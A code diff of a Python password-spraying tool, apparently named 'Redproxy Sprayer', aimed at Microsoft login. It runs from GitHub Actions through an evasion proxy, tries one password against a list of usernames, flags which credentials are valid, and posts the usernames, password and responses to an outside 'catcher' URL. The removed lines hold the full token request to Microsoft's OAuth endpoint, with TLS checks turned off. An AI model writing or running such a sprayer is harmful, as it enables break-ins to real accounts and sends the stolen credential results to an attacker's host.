@@ -1,78 +1,65 @@
-# microsoft login with thermoptic proxy -  https://github.com/mandatoryprogrammer/thermoptic
-import requests
+"""
+Redproxy Sprayer — Microsoft target.
+Runs inside GitHub Actions, sends requests through Thermoptic proxy.
+"""
 import os
+import sys
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
+
+import requests
 from urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-required_env_vars = ["USERNAMES", "PASSWORD", "CATCHERURL", "CATCHERTLS"]
-missing_env_vars = [var for var in required_env_vars if os.getenv(var) is None]
+from lib.targets.microsoft import MicrosoftTarget
+from lib.common import load_env_vars
 
-if missing_env_vars:
-    missing_vars_str = ", ".join(missing_env_vars)
-    raise ValueError(f"Missing environment variables: {missing_vars_str}")
 
-usernames = os.getenv("USERNAMES").split(',')
-password = os.getenv("PASSWORD")
-catcher_URL = os.getenv("CATCHERURL")
-catcher_uses_TLS_str = os.getenv("CATCHERTLS")
-catcher_uses_TLS = catcher_uses_TLS_str.lower() == "true"
+def main():
+    env = load_env_vars(["USERNAMES", "PASSWORD", "CATCHERURL", "CATCHERTLS"])
 
-def send_login_request(username, password):
-    url = "https://login.microsoft.com/common/oauth2/token"
-    body_params = {
-        "resource": "https://graph.windows.net",
-        "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
-        "client_info": "1",
-        "grant_type": "password",
-        "username": username,
-        "password": password,
-        "scope": "openid",
-    }
-    post_headers = {
-        "Accept": "application/json",
-        "Content-Type": "application/x-www-form-urlencoded",
-        "User-Agent": "anything@gankd, this will be changed after proxy",
-    }
+    usernames = env["USERNAMES"].split(",")
+    password = env["PASSWORD"]
+    catcher_url = env["CATCHERURL"]
+    use_tls = env["CATCHERTLS"].lower() == "true"
+
+    proxy_url = os.getenv("PROXY_URL", "http://changeme:changeme@127.0.0.1:1234")
+    target = MicrosoftTarget(proxy_url=proxy_url)
+
+    results = []
+    for username in usernames:
+        username = username.strip()
+        if not username:
+            continue
+
+        result = target.spray(username, password)
+        parsed = target.parse_response(result)
+
+        results.append({
+            "username": result.username,
+            "password": result.password,
+            "status_code": result.status_code,
+            "response": result.response,
+            "target": target.name,
+            **{k: v for k, v in parsed.items() if k not in ("username", "password", "status_code")},
+        })
+
+        marker = "+" if parsed["valid_creds"] else "-"
+        print(f"[{marker}] {username}: {parsed['verdict']}")
 
     try:
-        response = requests.post(
-            url,
-            proxies={"http": "http://changeme:changeme@127.0.0.1:1234", "https": "http://changeme:changeme@127.0.0.1:1234"},
-            headers=post_headers,
-            data=body_params,
-            timeout=5,
-            verify=False
+        resp = requests.post(
+            catcher_url,
+            json=results,
+            timeout=10,
+            verify=use_tls,
         )
-        return response.status_code, response.text
+        print(f"[+] Results sent to catcher ({len(results)} entries, HTTP {resp.status_code})")
+    except requests.RequestException as e:
+        print(f"[-] Failed to send to catcher: {e}")
+        sys.exit(1)
 
-    except requests.RequestException:
-        return None, None
 
-def send_data_to_catcher(data, use_ssl):
-    if not use_ssl:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-    try:
-        response = requests.post(catcher_URL, json=data, timeout=3, verify=use_ssl)
-        print("[+] Data sent to the catcher.")
-    except requests.RequestException:
-        print(f"[-] Failed to send data to the catcher.")
-        
-# Initialize an empty list to store results
-results = []
-
-# Iterate over each username and perform login request
-for username in usernames:
-    login_response_code, login_response = send_login_request(username, password)
-    result = {
-        "username": username,
-        "password": password,
-    }
-    if login_response_code is not None and login_response is not None:
-        result["status_code"] = login_response_code
-        result["response"] = login_response
-    else:
-        result["status_code"] = 500
-        result["response"] = "Github actions workflow failed to perform login request"
-    results.append(result)
-
-# Send all results to the catcher
-send_data_to_catcher(results, use_ssl=catcher_uses_TLS)
+if __name__ == "__main__":
+    main()
